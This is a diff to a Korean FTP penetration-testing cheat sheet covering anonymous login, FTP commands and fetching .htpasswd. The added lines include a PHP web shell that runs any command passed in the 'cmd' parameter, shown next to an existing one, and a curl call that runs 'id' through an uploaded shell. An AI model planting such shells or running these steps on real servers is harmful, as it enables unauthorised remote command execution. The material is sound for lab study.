@@ -36,9 +36,7 @@ ftp target.com 2121      # 비표준 포트 연결
 nc -v target.com 21      # netcat으로 수동 연결
 
 # 로그인 방법
-![](https://velog.velcdn.com/images/agnusdei1207/post/ddfc1ee9-267b-4343-bf30-cec70c5473c5/image.png)
-
-anonymous               # 익명 로그인
+anonymous               # 익명 로그인 -> 비밀번호 아무거나
 anonymous@domain.com    # 익명 로그인 (이메일 형식)
 user                    # 특정 계정
 ```
@@ -46,6 +44,7 @@ user                    # 특정 계정
 ### 내부 명령어
 
 ```bash
+cd ftp               # ftp 디렉토리
 ls -la             # 상세 파일 목록
 dir                # 파일 목록 (윈도우 스타일)
 cd directory       # 디렉터리 이동
@@ -69,6 +68,8 @@ mput file1 file2        # 여러 파일 업로드
 ftp target.com
 > anonymous
 > (Enter 또는 아무 이메일)
+
+# c
 
 # 스크립트로 자동 테스트
 echo -e "anonymous\nanonymous\nbye\n" | ftp -nv target.com
@@ -226,9 +227,17 @@ ftp> get .htpasswd
 
 1. 웹셸 업로드 테스트:
 
+```php
+<?php
+    echo shell_exec($_GET['cmd']);
+?>
+```
+
 ```bash
 # 웹셸 준비
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+curl http://10.64.144.72/ftp/web.php?cmd=id
 
 # FTP로 업로드
 ftp target_ip
